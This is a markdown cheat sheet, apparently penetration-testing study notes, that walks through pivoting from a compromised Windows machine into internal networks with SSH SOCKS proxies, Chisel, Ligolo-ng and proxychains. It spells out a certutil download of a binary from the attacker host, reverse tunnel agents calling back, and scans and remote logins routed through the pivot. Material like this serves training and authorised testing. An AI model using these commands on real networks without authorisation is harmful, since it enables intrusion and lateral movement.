---
title: Pivoting
tags: [pivoting, ssh, chisel, ligolo-ng, proxychains, socks, lateral-movement, tunneling]
---

# Pivoting

## What is Pivoting?

Pivoting = Using a hacked machine as a "bridge" to reach machines you can't see directly.

```
You (Kali) → [Door: Windows01] → [Hidden Room: Target]
              ↑
         You control this door now
```

You can't walk straight to the hidden room. But since you control the door (Windows01), you can send your tools _through_ it.

| Type | What it does | When to use | Example command |
|------|-------------|-------------|-----------------|
| **SSH Local Forward** | Forwards one port from target → your machine | You need to access a single service (e.g., RDP, web) | `ssh -L 8080:172.16.2.100:80 user@10.0.0.50` |
| **SSH Dynamic (SOCKS)** | Creates a full proxy — any tool can route through it | You want to scan/explore the whole internal network | `ssh -D 1080 user@10.0.0.50` |
| **Chisel** | Encrypted tunnel over HTTP, works where SSH is blocked | Windows targets, restrictive firewalls, need flexibility | `chisel server -p 8000 --reverse` (Kali) + client on Windows01 |
| **Ligolo-ng** | Creates a virtual network interface (TUN) — feels like you're on the network | Multi-hop pivoting, want to use normal tools without proxychains | `ligolo-ng -selfcert -laddr 0.0.0.0:11601` |

> **Rule of thumb**: Start with SSH if available. Use Chisel for Windows or when SSH fails. Use Ligolo-ng when you need to pivot through 2+ machines cleanly.

---

## Your 3-Machine Scenario (Visual)

```
[Your Kali] 192.168.1.10
       │
       │ (you control this)
       ▼
[Windows01] 10.0.0.50   ← Compromised pivot
       │
       │ (only this path exists)
       ▼
[Target] 172.16.2.100   ← What you really want
```

**Goal**: Run `nmap`, `crackmapexec`, or `evil-winrm` against `172.16.2.100` from your Kali.

---

## Method 1: SSH Tunnel (Simplest, if Windows01 has SSH)

### Step 1 — Create a SOCKS proxy through Windows01

```bash
# On Kali
ssh -D 1080 -N user@10.0.0.50
# -D 1080 = SOCKS proxy on local port 1080
# -N = no remote command (just tunnel)
```

### Step 2 — Configure proxychains (once)

```bash
# Edit /etc/proxychains.conf
# Comment out other lines, add at the bottom:
socks5 127.0.0.1 1080
```

### Step 3 — Run any tool through the tunnel

```bash
proxychains nmap -sT 172.16.2.100          # TCP scan (SOCKS needs -sT)
proxychains evil-winrm -i 172.16.2.100 -u admin
proxychains curl http://172.16.2.100
```

Works immediately. No extra config on target.

!!! warning
    SOCKS proxies only work with TCP. For UDP (like DNS), use Ligolo-ng or SSH `-w` tunneling.

---

## Method 2: Chisel (When SSH isn't available / Windows target)

### Step 1 — Start the Chisel server on Kali

```bash
# Download from: https://github.com/jpillora/chisel/releases
chisel server -p 8000 --reverse --key mykey
```

### Step 2 — Get the Chisel binary to Windows01

```bash
# Option A: SCP if you have credentials
scp chisel.exe user@10.0.0.50:C:\Users\Public\

# Option B: certutil or PowerShell from a shell
certutil -urlcache -split -f http://192.168.1.10/chisel.exe C:\chisel.exe
```

### Step 3 — Start Chisel client on Windows01 (reverse SOCKS)

```cmd
# In cmd.exe on Windows01
chisel.exe client 192.168.1.10:8000 R:1080:socks
# R:1080:socks = remote port 1080 on Kali becomes SOCKS proxy
```

### Step 4 — Use proxychains on Kali (same as SSH method)

```bash
# /etc/proxychains.conf already has: socks5 127.0.0.1 1080
proxychains nmap -sT 172.16.2.100
```

Works on Windows, bypasses many firewalls (tunnel is HTTP + encrypted).

---

## Method 3: Ligolo-ng (Best for multi-hop / clean routing)

### Step 1 — Install on Kali

```bash
sudo apt install ligolo-ng    # included in Kali 2024.2+
```

### Step 2 — Create TUN interface (virtual network card)

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip addr add 10.10.10.1/24 dev ligolo    # arbitrary internal IP for your Kali
```

### Step 3 — Start Ligolo proxy on Kali

```bash
ligolo-ng -selfcert -laddr 0.0.0.0:11601
```

### Step 4 — Run the agent on Windows01

```bash
# Download agent from GitHub releases
agent.exe -connect 192.168.1.10:11601 -ignore-cert
```

### Step 5 — On Kali proxy prompt, start tunnel and add route

```bash
# In ligolo-ng prompt:
session          # pick the Windows01 session
ifconfig         # see its interfaces (e.g., 172.16.2.0/24)
start            # activate tunnel

# Then on Kali shell (new terminal):
sudo ip route add 172.16.2.0/24 dev ligolo
```

### Step 6 — Use tools normally (no proxychains needed!)

```bash
nmap -sV 172.16.2.100          # works like you're on the same LAN
evil-winrm -i 172.16.2.100 -u admin
crackmapexec smb 172.16.2.0/24
```

Feels like direct access. Best for 2+ hops.

---

## Double Pivot (3+ machines)

If Target (172.16.2.100) can reach another network (e.g., 10.20.30.0/24):

**With Ligolo-ng** (easiest):

1. Compromise the next machine
2. Upload new `agent.exe` to it
3. Connect it to your already-running Ligolo proxy (via the first pivot)
4. Add new route: `sudo ip route add 10.20.30.0/24 dev ligolo`
5. Scan normally: `nmap 10.20.30.50`

**With Chisel/SSH**: You'd need nested proxychains or multiple `-D` ports — gets messy fast. This is why Ligolo-ng shines for multi-hop.

---

## "I get confused with 2+ hops" — Quick Checklist

When stuck, ask these:

1. **Can I reach the next hop's IP from my current pivot?**
   → `ping`, `nc -zv`, or `Test-NetConnection` on Windows.

2. **What interface/subnet is the target on?**
   → On pivot: `ipconfig` / `ip a` / `Get-NetIPAddress`.

3. **Do I need TCP only, or UDP too?**
   → SOCKS/Chisel = TCP only. Ligolo-ng = TCP + UDP.

4. **Am I using the right proxychains mode?**
   → `proxychains.conf`: use `socks5 127.0.0.1 <port>` for SSH/Chisel SOCKS.
   → Use `proxychains nmap -sT` (not -sS) — SYN scan doesn't work over SOCKS.

5. **Is the tunnel actually alive?**
   → Test: `proxychains curl ifconfig.me` should return pivot's external IP.
